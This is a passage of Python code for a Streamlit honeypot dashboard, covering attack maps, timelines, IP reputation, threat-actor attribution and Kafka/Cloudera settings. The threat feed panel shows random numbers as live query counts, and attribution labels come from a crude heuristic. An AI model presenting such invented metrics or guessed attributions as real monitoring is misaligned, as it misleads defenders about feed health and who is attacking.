                "severity": ca["severity"]
            }
        attacker_counts[ip]["count"] += 1
        attacker_counts[ip]["actions"].append(ca["action_type"])

    if attacker_counts:
        attacker_df_data = []
        for ip, data in sorted(attacker_counts.items(), key=lambda x: x[1]["count"], reverse=True)[:10]:
            attacker_df_data.append({
                "IP Address": ip,
                "Counter-Attacks": data["count"],
                "Actions": ", ".join(set(data["actions"])),
                "Severity": data["severity"]
            })
        with st.expander(f"🎯 Top attackers ({len(attacker_df_data)})", expanded=False):
            st.dataframe(pd.DataFrame(attacker_df_data), use_container_width=True, hide_index=True)

    # Type counts already shown in Breakdown charts — keep a compact collapsed grid
    intel_count = sum(1 for ca in counter_attacks if ca["action_type"] == "GATHER_INTELLIGENCE")
    tarpit_count = sum(1 for ca in counter_attacks if ca["action_type"] == "DEPLOY_TARPIT")
    reports_count = sum(1 for ca in counter_attacks if ca["action_type"] == "REPORT_TO_AUTHORITIES")
    shares_count = sum(1 for ca in counter_attacks if ca["action_type"] == "SHARE_THREAT_INTEL")
    tracks_count = sum(1 for ca in counter_attacks if ca["action_type"] == "TRACK_BEHAVIOR")
    disinfo_count = sum(1 for ca in counter_attacks if ca["action_type"] == "FEED_DISINFORMATION")
    with st.expander("Effectiveness by action type", expanded=False):
        st.markdown(
            f"""
            <div class="eff-grid">
              <div class="eff-cell"><div class="label">Intelligence</div><div class="value">{intel_count}</div></div>
              <div class="eff-cell"><div class="label">Tarpits</div><div class="value">{tarpit_count}</div></div>
              <div class="eff-cell"><div class="label">Authority reports</div><div class="value">{reports_count}</div></div>
              <div class="eff-cell"><div class="label">Threat shares</div><div class="value">{shares_count}</div></div>
              <div class="eff-cell"><div class="label">Behavior tracks</div><div class="value">{tracks_count}</div></div>
              <div class="eff-cell"><div class="label">Disinfo feeds</div><div class="value">{disinfo_count}</div></div>
            </div>
            """,
            unsafe_allow_html=True,
        )


def render_geographic_dashboard(alerts_data):
    """Render the geographic visualization dashboard."""
    st.markdown(
        '<div class="main-header">Geographic Attack Analysis</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Origin map and regional heat</p>',
        unsafe_allow_html=True,
    )

    if not alerts_data:
        st.warning("No threat detection data available. Run the demo first to generate data.")
        return

    # Clear stale whois cache so lab-IP demo geo applies after upgrades
    if st.session_state.pop("_geo_cache_busted", True):
        try:
            lookup_whois_cached.clear()
        except Exception:
            pass
        st.session_state["_geo_cache_busted"] = False

    geo_data = extract_geographic_data(alerts_data)

    if not geo_data:
        st.info("No alerts with a source IP yet. Simulate an attack or ingest Cowrie logs.")
        return

    if any(g.get("demo") for g in geo_data):
        st.caption(
            "Lab / TEST-NET IPs use demo geography (whois is not available for documentation ranges)."
        )

    st.subheader("Overview")
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Countries", len(geo_data))
    col2.metric("Attacks", sum(g["attack_count"] for g in geo_data))
    col3.metric("Unique IPs", sum(g["unique_ips"] for g in geo_data))
    col4.metric("Top", geo_data[0]["country"] if geo_data else "—")

    st.subheader("Origins map")
    map_df = pd.DataFrame(
        [
            {
                "country": geo["country"],
                "attacks": geo["attack_count"],
                "unique_ips": geo["unique_ips"],
                "lat": geo.get("lat", 20.0),
                "lon": geo.get("lon", 0.0),
            }
            for geo in geo_data
        ]
    )

    try:
        fig_map = px.scatter_geo(
            map_df,
            lat="lat",
            lon="lon",
            size="attacks",
            hover_name="country",
            hover_data={"attacks": True, "unique_ips": True, "lat": False, "lon": False},
            color="attacks",
            color_continuous_scale=["#f4f1fa", "#ffb38a", "#ff550d", "#120046"],
            labels={"attacks": "Attacks"},
            size_max=48,
        )
        fig_map.update_layout(
            height=480,
            margin=dict(l=0, r=0, t=10, b=0),
            geo=dict(showframe=False, showcoastlines=True, bgcolor="#f4f1fa"),
            paper_bgcolor="#f4f1fa",
        )
        st.plotly_chart(fig_map, use_container_width=True)
    except Exception as e:
        st.caption(f"Map unavailable ({e})")
        st.dataframe(map_df[["country", "attacks", "unique_ips"]], use_container_width=True, hide_index=True)

    with st.expander(f"By country ({len(geo_data)})", expanded=False):
        st.dataframe(
            [
                {
                    "Country": g["country"],
                    "Attacks": g["attack_count"],
                    "IPs": g["unique_ips"],
                    "Top severity": max(g["severities"], key=g["severities"].get) if g["severities"] else "—",
                }
                for g in geo_data
            ],
            use_container_width=True,
            hide_index=True,
        )

    with st.expander("Heat charts", expanded=False):
        col1, col2 = st.columns(2)
        with col1:
            top_countries = geo_data[:10]
            fig_top = px.bar(
                x=[g["country"] for g in top_countries],
                y=[g["attack_count"] for g in top_countries],
                title="Top 10 Attacking Countries",
                labels={"x": "Country", "y": "Attack Count"},
                color=[g["attack_count"] for g in top_countries],
                color_continuous_scale=["#f4f1fa", "#ffb38a", "#ff550d", "#120046"]
            )
            fig_top.update_layout(showlegend=False)
            st.plotly_chart(fig_top, use_container_width=True)
        with col2:
            severity_data = []
            for geo in geo_data[:10]:
                for severity, count in geo["severities"].items():
                    severity_data.append({
                        "country": geo["country"],
                        "severity": severity,
                        "count": count
                    })
            if severity_data:
                severity_df = pd.DataFrame(severity_data)
                fig_severity = px.bar(
                    severity_df,
                    x="country",
                    y="count",
                    color="severity",
                    title="Severity Distribution by Country",
                    color_discrete_map=SEVERITY_COLOR_MAP
                )
                st.plotly_chart(fig_severity, use_container_width=True)

    with st.expander("Country details", expanded=False):
        selected_country = st.selectbox(
            "Select country",
            options=[g["country"] for g in geo_data],
            index=0,
            key="geo_country_details",
        )
        selected_geo = next((g for g in geo_data if g["country"] == selected_country), None)
        if selected_geo:
            col1, col2, col3 = st.columns(3)
            col1.metric("Attacks", selected_geo["attack_count"])
            col2.metric("Unique IPs", selected_geo["unique_ips"])
            top_threat = (
                max(selected_geo["threat_types"].items(), key=lambda x: x[1])[0]
                if selected_geo["threat_types"] else "N/A"
            )
            col3.metric("Top threat", top_threat)
            if selected_geo["threat_types"]:
                st.dataframe(
                    pd.DataFrame([
                        {"Threat Type": k, "Count": v}
                        for k, v in selected_geo["threat_types"].items()
                    ]),
                    use_container_width=True,
                    hide_index=True,
                )
            if selected_geo["ips"]:
                st.caption("Sample IPs")
                st.code("\n".join(selected_geo["ips"][:10]))
            n_geo = len(selected_geo["alerts"])
            if selected_geo["alerts"]:
                st.caption(f"Recent alerts ({n_geo})")
                st.dataframe(
                    pd.DataFrame([
                        {
                            "Alert ID": a["alert_id"],
                            "IP": a["ip"],
                            "Timestamp": a["timestamp"],
                            "Severity": a["severity"],
                            "Threat Type": a["threat_type"],
                        }
                        for a in selected_geo["alerts"][:20]
                    ]),
                    use_container_width=True,
                    hide_index=True,
                )


def render_timeline_patterns_dashboard(alerts_data):
    """Render the attack timeline and patterns dashboard."""
    st.markdown(
        '<div class="main-header">Attack Timeline & Patterns</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Temporal distribution of alerts</p>',
        unsafe_allow_html=True,
    )
    
    if not alerts_data:
        st.warning("No threat detection data available. Run the demo first to generate data.")
        return
    
    # Detect patterns
    with st.spinner("Analyzing attack patterns..."):
        patterns = detect_attack_patterns(alerts_data)
    
    # Statistics
    st.header("📊 Pattern Statistics")
    
    col1, col2, col3, col4 = st.columns(4)
    
    repeated_ips_count = len([ip for ip, data in patterns["repeated_ips"].items() if data["count"] > 1])
    similar_commands_count = len([cmd for cmd, data in patterns["similar_commands"].items() if data["count"] > 1])
    coordinated_attacks_count = len(patterns["coordinated_attacks"])
    time_patterns_count = len(patterns["time_patterns"])
    
    with col1:
        st.metric("Repeated IPs", repeated_ips_count)
    with col2:
        st.metric("Similar Commands", similar_commands_count)
    with col3:
        st.metric("Coordinated Attacks", coordinated_attacks_count)
    with col4:
        st.metric("Time Patterns", time_patterns_count)
    
    # Interactive Timeline
    st.header("📅 Attack Timeline")
    
    timeline_data = []
    for alert in alerts_data:
        timestamp = alert.get("timestamp", "")
        dt = _parse_alert_timestamp(timestamp)
        if dt is None:
            continue
        timeline_data.append({
            "Timestamp": dt,
            "Source IP": alert.get("source_ip", "N/A"),
            "Threat Type": alert.get("threat_type", "UNKNOWN"),
            "Severity": alert.get("severity", "UNKNOWN"),
            "Alert ID": alert.get("alert_id", "N/A")
        })
    
    if timeline_data:
        timeline_df = _coerce_timeline_dataframe(pd.DataFrame(timeline_data))
        
        # Timeline visualization
        fig_timeline = px.scatter(
            timeline_df,
            x="Timestamp",
            y="Threat Type",
            color="Severity",
            size=[10] * len(timeline_df),
            hover_data=["Source IP", "Alert ID"],
            title="Attack Timeline",
            color_discrete_map=SEVERITY_COLOR_MAP
        )
        st.plotly_chart(fig_timeline, use_container_width=True)
        
        with st.expander("⏰ Time-based analysis", expanded=False):
            col1, col2 = st.columns(2)
            with col1:
                timeline_df["Hour"] = timeline_df["Timestamp"].dt.hour
                hourly_counts = timeline_df.groupby("Hour").size()
                fig_hourly = px.bar(
                    x=hourly_counts.index,
                    y=hourly_counts.values,
                    title="Attacks by Hour of Day",
                    labels={"x": "Hour", "y": "Attack Count"},
                )
                st.plotly_chart(fig_hourly, use_container_width=True)
            with col2:
                timeline_df["Day"] = timeline_df["Timestamp"].dt.strftime("%A")
                daily_counts = timeline_df.groupby("Day").size()
                day_order = [
                    "Monday", "Tuesday", "Wednesday", "Thursday",
                    "Friday", "Saturday", "Sunday",
                ]
                daily_counts = daily_counts.reindex(
                    [d for d in day_order if d in daily_counts.index]
                )
                fig_daily = px.bar(
                    x=daily_counts.index,
                    y=daily_counts.values,
                    title="Attacks by Day of Week",
                    labels={"x": "Day", "y": "Attack Count"},
                )
                st.plotly_chart(fig_daily, use_container_width=True)
    
    repeated_ips = sorted(
        [(ip, data) for ip, data in patterns["repeated_ips"].items() if data["count"] > 1],
        key=lambda x: x[1]["count"],
        reverse=True
    )[:20]
    with st.expander(f"🔄 Repeated IP patterns ({len(repeated_ips)})", expanded=False):
        if repeated_ips:
            st.dataframe(
                pd.DataFrame([
                    {
                        "IP Address": ip,
                        "Attack Count": data["count"],
                        "First Seen": data["first_seen"],
                        "Last Seen": data["last_seen"],
                        "Threat Types": ", ".join(data["threat_types"]),
                    }
                    for ip, data in repeated_ips
                ]),
                use_container_width=True,
                hide_index=True,
            )
        else:
            st.caption("No repeated IP patterns detected.")

    similar_commands = sorted(
        [(cmd_hash, data) for cmd_hash, data in patterns["similar_commands"].items() if data["count"] > 1],
        key=lambda x: x[1]["count"],
        reverse=True
    )[:20]
    with st.expander(f"⌨️ Similar command patterns ({len(similar_commands)})", expanded=False):
        if similar_commands:
            for cmd_hash, data in similar_commands:
                with st.expander(
                    f"`{data['command'][:80]}` ({data['count']}×)",
                    expanded=False,
                ):
                    st.code(data["command"], language="bash")
                    st.caption(
                        f"{data['count']} occurrences · {len(data['ips'])} IPs · "
                        f"{', '.join(list(data['ips'])[:10])}"
                    )
        else:
            st.caption("No similar command patterns detected.")

    n_coord = len(patterns["coordinated_attacks"])
    with st.expander(f"🎯 Coordinated attacks ({n_coord})", expanded=False):
        if patterns["coordinated_attacks"]:
            st.dataframe(
                pd.DataFrame([
                    {
                        "Time Window": ca["window"],
                        "Unique IPs": ca["unique_ips"],
                        "Total Attacks": ca["total_attacks"],
                        "IPs": ", ".join(ca["ips"][:5]),
                    }
                    for ca in patterns["coordinated_attacks"][:20]
                ]),
                use_container_width=True,
                hide_index=True,
            )
            st.caption("Multiple IPs in the same window may indicate a botnet or coordinated campaign.")
        else:
            st.caption("No coordinated attacks detected.")

    ip_groups = {}
    for alert in alerts_data:
        source_ip = alert.get("source_ip", "")
        if source_ip:
            ip_groups.setdefault(source_ip, []).append(alert)
    correlated_ips = {ip: alerts for ip, alerts in ip_groups.items() if len(alerts) > 1}
    with st.expander(f"🔗 Attack correlation ({len(correlated_ips)} IPs)", expanded=False):
        if correlated_ips:
            selected_ip = st.selectbox(
                "IP",
                options=sorted(correlated_ips.keys()),
                index=0,
                key="timeline_corr_ip",
            )
            correlated_alerts = correlated_ips[selected_ip]
            st.caption(f"{len(correlated_alerts)} related attacks from {selected_ip}")
            st.dataframe(
                pd.DataFrame([
                    {
                        "Alert ID": a.get("alert_id", "N/A"),
                        "Timestamp": a.get("timestamp", "N/A"),
                        "Threat Type": a.get("threat_type", "UNKNOWN"),
                        "Severity": a.get("severity", "UNKNOWN"),
                    }
                    for a in correlated_alerts
                ]),
                use_container_width=True,
                hide_index=True,
            )
        else:
            st.caption("No correlated attacks found.")


def render_threat_intelligence_dashboard(alerts_data):
    """Render the threat intelligence integration dashboard."""
    st.markdown(
        '<div class="main-header">Threat Intelligence</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Reputation and feed status</p>',
        unsafe_allow_html=True,
    )
    
    if not alerts_data:
        st.warning("No threat detection data available. Run the demo first to generate data.")
        return
    
    # Extract unique IPs
    unique_ips = set()
    ip_alerts = {}
    
    for alert in alerts_data:
        source_ip = alert.get("source_ip", "")
        if source_ip and not is_private_ip(source_ip):
            unique_ips.add(source_ip)
            if source_ip not in ip_alerts:
                ip_alerts[source_ip] = []
            ip_alerts[source_ip].append(alert)
    
    # Check if we have any public IPs
    if not unique_ips:
        st.warning("No public IP addresses found in the alerts. All IPs may be private/local addresses.")
        st.info("Threat intelligence analysis requires public IP addresses. Private IPs cannot be analyzed with external threat intelligence feeds.")
        return
    
    # Statistics
    st.header("📊 Threat Intelligence Overview")
    
    col1, col2, col3, col4 = st.columns(4)
    
    total_ips = len(unique_ips)
    
    # Calculate reputation scores
    reputation_scores = []
    for ip in list(unique_ips)[:100]:  # Limit to first 100 for performance
        whois_data = lookup_whois_cached(ip)
        score = get_threat_intelligence_score(ip, whois_data)
        reputation_scores.append(score)
    
    high_risk_count = sum(1 for s in reputation_scores if s["threat_level"] == "HIGH")
    medium_risk_count = sum(1 for s in reputation_scores if s["threat_level"] == "MEDIUM")
    low_risk_count = sum(1 for s in reputation_scores if s["threat_level"] == "LOW")
    
    with col1:
        st.metric("Total IPs Analyzed", total_ips)
    with col2:
        st.metric("High Risk IPs", high_risk_count, delta=None)
    with col3:
        st.metric("Medium Risk IPs", medium_risk_count, delta=None)
    with col4:
        st.metric("Low Risk IPs", low_risk_count, delta=None)
    
    # IP Reputation Scores Visualization
    st.header("📈 IP Reputation Scores")
    
    # Prepare reputation data
    rep_data = []
    for ip in list(unique_ips)[:100]:
        try:
            whois_data = lookup_whois_cached(ip)
            score = get_threat_intelligence_score(ip, whois_data)
            attack_count = len(ip_alerts.get(ip, []))
            
            rep_data.append({
                "IP": ip,
                "Reputation Score": score.get("reputation_score", 0),
                "Threat Level": score.get("threat_level", "UNKNOWN"),
                "Abuse Reports": score.get("abuse_reports", 0),
                "Attack Count": attack_count,
                "Sources": ", ".join(score.get("sources", [])) if score.get("sources") else "None"
            })
        except Exception as e:
            # Skip IPs that cause errors, but log for debugging
            continue
    
    # Create DataFrame only if we have data
    if rep_data:
        rep_df = pd.DataFrame(rep_data)
    else:
        rep_df = pd.DataFrame()  # Empty DataFrame with no columns
    
    if rep_df.empty or len(rep_df.columns) == 0:
        st.warning("No IP reputation data available. All IPs may be private or whois lookups failed.")
    else:
        col1, col2 = st.columns(2)
        
        with col1:
            # Reputation score distribution
            if len(rep_df) > 0 and "Reputation Score" in rep_df.columns:
                fig_rep = px.histogram(
                    rep_df,
                    x="Reputation Score",
                    nbins=20,
                    title="Reputation Score Distribution",
                    labels={"Reputation Score": "Score", "count": "Number of IPs"}
                )
                st.plotly_chart(fig_rep, use_container_width=True)
            else:
                st.info("No reputation data to display")
        
        with col2:
            # Threat level distribution
            if len(rep_df) > 0 and "Threat Level" in rep_df.columns:
                threat_counts = rep_df["Threat Level"].value_counts()
                if len(threat_counts) > 0:
                    fig_threat = px.pie(
                        values=threat_counts.values,
                        names=threat_counts.index,
                        title="Threat Level Distribution",
                        color_discrete_map={
                            "HIGH": SEVERITY_COLOR_MAP["HIGH"],
                            "MEDIUM": SEVERITY_COLOR_MAP["MEDIUM"],
                            "LOW": SEVERITY_COLOR_MAP["LOW"],
                            "UNKNOWN": "#9a92b0",
                        }
                    )
                    st.plotly_chart(fig_threat, use_container_width=True)
                else:
                    st.info("No threat level data to display")
            else:
                st.info("No threat level data to display")
    
    with st.expander("📡 Threat feed status", expanded=False):
        threat_feeds = {
            "AbuseIPDB": {"status": "active", "queries_today": random.randint(50, 200), "rate_limit": "1000/day"},
            "VirusTotal": {"status": "active", "queries_today": random.randint(20, 100), "rate_limit": "4/minute"},
            "Shodan": {"status": "inactive", "queries_today": 0, "rate_limit": "1/second"},
            "MISP": {"status": "active", "queries_today": random.randint(10, 50), "rate_limit": "unlimited"},
        }
        feed_cols = st.columns(len(threat_feeds))
        for idx, (feed_name, feed_data) in enumerate(threat_feeds.items()):
            with feed_cols[idx]:
                status_emoji = "✅" if feed_data["status"] == "active" else "❌"
                st.markdown(f"**{status_emoji} {feed_name}**")
                st.caption(f"{feed_data['status']} · {feed_data['queries_today']} queries · {feed_data['rate_limit']}")

    top_ips = sorted(ip_alerts.items(), key=lambda x: len(x[1]), reverse=True)[:10]
    with st.expander(f"📊 IP reputation detail ({len(top_ips)})", expanded=False):
        if top_ips:
            selected_ip = st.selectbox(
                "IP",
                options=[ip for ip, _ in top_ips],
                index=0,
                key="ti_hist_ip",
            )
            whois_data = lookup_whois_cached(selected_ip)
            score = get_threat_intelligence_score(selected_ip, whois_data)
            alerts = ip_alerts[selected_ip]
            col1, col2 = st.columns(2)
            with col1:
                st.metric("Reputation Score", score["reputation_score"])
                st.metric("Threat Level", score["threat_level"])
                st.metric("Abuse Reports", score["abuse_reports"])
                st.metric("Attack Count", len(alerts))
            with col2:
                for source in score["sources"]:
                    st.markdown(f"✅ {source}")
                if whois_data and whois_data.get("country") != "N/A":
                    st.markdown(f"**Country:** {whois_data.get('country')}")
                if whois_data and whois_data.get("asn") != "N/A":
                    st.markdown(f"**ASN:** {whois_data.get('asn')}")
            st.dataframe(
                pd.DataFrame([
                    {
                        "Alert ID": a.get("alert_id", "N/A"),
                        "Timestamp": a.get("timestamp", "N/A"),
                        "Threat Type": a.get("threat_type", "UNKNOWN"),
                        "Severity": a.get("severity", "UNKNOWN"),
                    }
                    for a in alerts
                ]),
                use_container_width=True,
                hide_index=True,
            )
        else:
            st.caption("No IPs to inspect.")

    attribution_data = []
    for ip, alerts in list(ip_alerts.items())[:50]:
        whois_data = lookup_whois_cached(ip)
        score = get_threat_intelligence_score(ip, whois_data)
        threat_types = set(a.get("threat_type", "") for a in alerts)
        if "SUCCESSFUL_INTRUSION" in threat_types:
            attribution = "Script Kiddie" if score["reputation_score"] > -30 else "Advanced Persistent Threat"
        elif len(threat_types) > 2:
            attribution = "Organized Crime Group"
        else:
            attribution = "Unknown"
        attribution_data.append({
            "IP": ip,
            "Attribution": attribution,
            "Confidence": "Medium" if score["reputation_score"] < -20 else "Low",
            "Attack Count": len(alerts),
            "Threat Level": score["threat_level"],
        })
    with st.expander(f"🎭 Threat actor attribution ({len(attribution_data)})", expanded=False):
        if attribution_data:
            st.dataframe(pd.DataFrame(attribution_data), use_container_width=True, hide_index=True)
        else:
            st.caption("No attribution data.")

    if not rep_df.empty and len(rep_df) > 0:
        with st.expander(f"Detailed IP reputation ({len(rep_df)})", expanded=False):
            st.dataframe(rep_df, use_container_width=True, hide_index=True)
            csv = rep_df.to_csv(index=False)
            st.download_button(
                label="📥 Download Reputation Data as CSV",
                data=csv,
                file_name=f"threat_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                mime="text/csv",
            )


def _env_file_candidates() -> list[Path]:
    """Likely ``.env`` paths (Docker mount first, then repo)."""
    return [
        Path("/opt/flink/.env"),
        Path(__file__).resolve().parents[1] / ".env",
        Path.cwd() / ".env",
        Path.cwd() / "honeypot" / ".env",
    ]


def resolve_env_file(*, writable_only: bool = False) -> Optional[Path]:
    for path in _env_file_candidates():
        try:
            if path.is_file():
                if writable_only and not os.access(path, os.W_OK):
                    continue
                return path
        except OSError:
            continue
    if writable_only:
        for path in _env_file_candidates():
            parent = path.parent
            try:
                if parent.is_dir() and os.access(parent, os.W_OK):
                    return path
            except OSError:
                continue
    return None


def _read_dotenv(path: Path) -> Dict[str, str]:
    out: Dict[str, str] = {}
    try:
        text = path.read_text(encoding="utf-8")
    except OSError:
        return out
    for line in text.splitlines():
        raw = line.strip()
        if not raw or raw.startswith("#") or "=" not in raw:
            continue
        key, _, val = raw.partition("=")
        key = key.strip()
        val = val.strip()
        if len(val) >= 2 and val[0] == val[-1] and val[0] in ("'", '"'):
            val = val[1:-1]
        if key:
            out[key] = val
    return out


def _upsert_dotenv(path: Path, updates: Dict[str, str]) -> None:
    """Create or update keys in a ``.env`` file (preserves other lines)."""
    try:
        lines = path.read_text(encoding="utf-8").splitlines() if path.is_file() else []
    except OSError:
        lines = []
    remaining = dict(updates)
    new_lines: list[str] = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith("#") and "=" in stripped:
            key = stripped.split("=", 1)[0].strip()
            if key in remaining:
                new_lines.append(f"{key}={remaining.pop(key)}")
                continue
        new_lines.append(line)
    if remaining:
        if new_lines and new_lines[-1].strip():
            new_lines.append("")
        new_lines.append("# Updated from HoneyPot Settings")
        for key, val in remaining.items():
            new_lines.append(f"{key}={val}")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(new_lines) + "\n", encoding="utf-8")


def _mask_secret(value: str, *, keep: int = 6) -> str:
    v = (value or "").strip()
    if not v:
        return "(empty)"
    if len(v) <= keep * 2:
        return "*" * min(len(v), 12)
    return f"{v[:keep]}…{v[-keep:]} ({len(v)} chars)"


def _init_settings_defaults() -> None:
    """Seed session settings from process env / ``.env`` once per session."""
    if st.session_state.get("_settings_seeded"):
        return
    env_file = resolve_env_file()
    dotenv = _read_dotenv(env_file) if env_file else {}

    def _pick(*keys: str, default: str = "") -> str:
        for key in keys:
            val = (os.environ.get(key) or dotenv.get(key) or "").strip()
            if val:
                return val
        return default

    st.session_state.setdefault(
        "cowrie_kafka_bootstrap",
        _pick("COWRIE_KAFKA_BOOTSTRAP", "KAFKA_BOOTSTRAP_SERVERS", default="kafka:9092"),
    )
    st.session_state.setdefault("cowrie_kafka_topic", _PREDEFINED_KAFKA_TOPICS[0])
    st.session_state.setdefault("cowrie_kafka_max_messages", 250)
    st.session_state.setdefault("cowrie_data_source_mode", "Both")
    st.session_state.setdefault(
        "settings_kafka_session_actor_topic",
        _pick("KAFKA_SESSION_ACTOR_TOPIC", default="cowrie.session_actor"),
    )
    st.session_state.setdefault(
        "settings_kafka_enriched_topic",
        _pick("KAFKA_NORMALIZED_ENRICHED_TOPIC", default="cowrie.normalized.enriched"),
    )
    st.session_state.setdefault(
        "settings_cloudera_base_url",
        _pick("CLOUDERA_AI_BASE_URL", "BASE_URL"),
    )
    st.session_state.setdefault(
        "settings_cloudera_model_id",
        _pick("CLOUDERA_MODEL_ID", "CLOUDERA_MODEL_NAME", "MODEL_ID"),
    )
    st.session_state.setdefault(
        "settings_cloudera_jwt",
        _pick("CLOUDERA_JWT_TOKEN", "CLOUDERA_API_KEY", "API_KEY"),
    )
    st.session_state["_settings_seeded"] = True


def apply_runtime_settings(
    *,
    kafka_bootstrap: str,
    session_actor_topic: str,
    enriched_topic: str,
    cloudera_base_url: str,
    cloudera_model_id: str,
    cloudera_jwt: str,
) -> None:
    """Push Settings values into ``os.environ`` for this Streamlit process."""
    bootstrap = (kafka_bootstrap or "").strip() or "kafka:9092"
    os.environ["COWRIE_KAFKA_BOOTSTRAP"] = bootstrap
    os.environ["KAFKA_BOOTSTRAP_SERVERS"] = bootstrap
    os.environ["KAFKA_SESSION_ACTOR_TOPIC"] = (session_actor_topic or "").strip() or "cowrie.session_actor"
    os.environ["KAFKA_NORMALIZED_ENRICHED_TOPIC"] = (
        (enriched_topic or "").strip() or "cowrie.normalized.enriched"
    )
    if cloudera_base_url.strip():
        os.environ["CLOUDERA_AI_BASE_URL"] = cloudera_base_url.strip()
    if cloudera_model_id.strip():
        os.environ["CLOUDERA_MODEL_ID"] = cloudera_model_id.strip()
    if cloudera_jwt.strip():
        os.environ["CLOUDERA_JWT_TOKEN"] = cloudera_jwt.strip()
        os.environ["CLOUDERA_API_KEY"] = cloudera_jwt.strip()


def _cloudera_status_lines() -> tuple[bool, list[str]]:
    """Return (ok, messages) for current Cloudera env."""
    messages: list[str] = []
    try:
        from cloudera_llm_config import get_cloudera_config, validate_config

        cfg = get_cloudera_config()
        ok = bool(validate_config(cfg))
        if ok:
            messages.append(f"Model `{cfg.get('model_id') or '—'}`")
            messages.append(f"Base URL `{cfg.get('base_url') or '—'}`")
            messages.append(f"Token {_mask_secret(str(cfg.get('api_key') or ''))}")
        else:
            messages.append("Configuration invalid — check base URL and JWT.")
        return ok, messages
    except Exception as exc:
        base = (os.environ.get("CLOUDERA_AI_BASE_URL") or "").strip()
        token = (os.environ.get("CLOUDERA_JWT_TOKEN") or "").strip()
        model = (os.environ.get("CLOUDERA_MODEL_ID") or "").strip()
        ok = bool(base and token and model)
        messages.append(f"Model `{model or '—'}`")
        messages.append(f"Base URL `{base or '—'}`")
        messages.append(f"Token {_mask_secret(token)}")
        if not ok:
            messages.append(f"Lookup helper unavailable: {exc}")
        return ok, messages


def _test_cloudera_llm_connection() -> Dict[str, Any]:
    """Live chat-completions ping using Settings / env Cloudera credentials."""
    import time

    base = (
        st.session_state.get("settings_cloudera_base_url")
        or os.environ.get("CLOUDERA_AI_BASE_URL")
        or os.environ.get("OPENAI_BASE_URL")
        or ""
    ).strip().rstrip("/")
    token = (
        st.session_state.get("settings_cloudera_jwt")
        or os.environ.get("CLOUDERA_JWT_TOKEN")
        or os.environ.get("CLOUDERA_API_KEY")
        or ""
    ).strip()
    model = (
        st.session_state.get("settings_cloudera_model_id")
        or os.environ.get("CLOUDERA_MODEL_ID")
        or os.environ.get("CLOUDERA_MODEL_NAME")
        or ""
    ).strip()

    jwt = _cloudera_jwt_status()
    if not base or not token or not model:
        return {
            "ok": False,
            "stage": "config",
            "error": "Missing base URL, model ID, or JWT — fill Cloudera fields and Apply first.",
            "jwt": jwt,
        }
    if not jwt.get("ok") and jwt.get("reason") == "expired":
        return {
            "ok": False,
            "stage": "jwt",
            "error": jwt.get("message") or "JWT expired",
            "jwt": jwt,
            "base_url": base,
            "model": model,
        }

    try:
        from openai import OpenAI
    except ImportError as exc:
        return {
            "ok": False,
            "stage": "import",
            "error": f"openai package missing: {exc}",
            "jwt": jwt,
        }

    base_url = base if "/v1" in base else f"{base}/v1"
    started = time.time()
    try:
        client = OpenAI(api_key=token, base_url=base_url)
        resp = client.chat.completions.create(
            model=model,
            messages=[{"role": "user", "content": "Reply with exactly: pong"}],
            max_tokens=8,
            temperature=0,
        )
        content = ((resp.choices[0].message.content or "") if resp.choices else "").strip()
        elapsed_ms = int((time.time() - started) * 1000)
        return {
            "ok": True,
            "stage": "chat",
            "elapsed_ms": elapsed_ms,
            "reply": content[:120],
            "model": model,
            "base_url": base_url,
            "jwt": jwt,
            "token": _mask_secret(token),
        }
    except Exception as exc:
        return {
            "ok": False,
            "stage": "chat",
            "error": _humanize_react_error(exc),
            "detail": str(exc)[:300],
            "elapsed_ms": int((time.time() - started) * 1000),
            "model": model,
            "base_url": base_url,
            "jwt": jwt,
        }


def render_settings_page() -> None:
    """Kafka + Cloudera settings with Kafka reachability status."""
    _init_settings_defaults()
    st.markdown(
        '<div class="main-header">Settings</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Kafka + Cloudera only — lab tests live under ReAct Agent Lab</p>',
        unsafe_allow_html=True,
    )

    env_writable = resolve_env_file(writable_only=True)

    with st.form("honeypot_settings_form", clear_on_submit=False):
        st.subheader("Kafka")
        data_source = st.radio(
            "Data source",
            options=["JSON file", "Kafka topic", "Both"],
            horizontal=True,
            index=["JSON file", "Kafka topic", "Both"].index(
                st.session_state.get("cowrie_data_source_mode", "Both")
            )
            if st.session_state.get("cowrie_data_source_mode", "Both")
            in ("JSON file", "Kafka topic", "Both")
            else 2,
        )
        kafka_bootstrap = st.text_input(
            "Bootstrap servers",
            value=st.session_state.get("cowrie_kafka_bootstrap", "kafka:9092"),
        )
        topic_default = st.session_state.get("cowrie_kafka_topic", _PREDEFINED_KAFKA_TOPICS[0])
        topic_index = (
            _PREDEFINED_KAFKA_TOPICS.index(topic_default)
            if topic_default in _PREDEFINED_KAFKA_TOPICS
            else 0
        )
        kafka_topic = st.selectbox(
            "Alerts topic",
            options=_PREDEFINED_KAFKA_TOPICS,
            index=topic_index,
        )
        kafka_max = st.slider(
            "Latest messages",
            min_value=25,
            max_value=1000,
            value=int(st.session_state.get("cowrie_kafka_max_messages", 250)),
            step=25,
        )
        session_actor_topic = st.text_input(
            "Session actor topic",
            value=st.session_state.get(
                "settings_kafka_session_actor_topic", "cowrie.session_actor"
            ),
        )
        enriched_topic = st.text_input(
            "Normalized enriched topic",
            value=st.session_state.get(
                "settings_kafka_enriched_topic", "cowrie.normalized.enriched"
            ),
        )

        st.subheader("Cloudera LLM")
        cloudera_base = st.text_input(
            "Base URL",
            value=st.session_state.get("settings_cloudera_base_url", ""),
        )
        cloudera_model = st.text_input(
            "Model ID",
            value=st.session_state.get("settings_cloudera_model_id", ""),
        )
        cloudera_jwt = st.text_input(
            "JWT token",
            value=st.session_state.get("settings_cloudera_jwt", ""),
            type="password",
        )
        persist = st.checkbox(
            "Save to .env",
            value=bool(env_writable),
            disabled=not bool(env_writable),
        )
        submitted = st.form_submit_button("Apply", use_container_width=True)

    if submitted:
        st.session_state["cowrie_data_source_mode"] = data_source
        st.session_state["cowrie_kafka_bootstrap"] = kafka_bootstrap.strip() or "kafka:9092"
        st.session_state["cowrie_kafka_topic"] = kafka_topic
